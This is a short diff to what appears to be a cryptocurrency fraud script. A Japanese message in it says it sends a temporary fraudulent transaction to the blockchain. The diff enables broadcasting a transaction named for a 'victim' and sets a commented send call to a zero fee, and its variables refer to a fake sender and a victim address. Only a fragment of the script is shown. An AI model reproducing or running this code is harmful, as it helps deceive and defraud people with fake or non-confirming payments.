@@ -130,17 +130,15 @@ time.sleep(3) #詠唱中...  -u-
 print("SND TMP ITX TOBC  (ブロックチェーンに一時的な不正なトランザクションを送信!)")
 time.sleep(2)
 
-counter = 0
-#transaction_util.pushtx(tx_victim)
-counter += 1
+transaction_util.pushtx(tx_victim)
 print()
 print("OK")
-#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=3)
+#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=0)
 #print(txid)
-print(blockcypher.pushtx(tx_victim,
-                coin_symbol=coin_symbol,
-                api_key=token))
-
+#print(blockcypher.pushtx(tx_victim,
+#                coin_symbol=coin_symbol,
+#                api_key=token))
+#
 
 #transaction_util.pushtx(tx_victim)
 #broadcast_transaction(tx_victim, testnet)
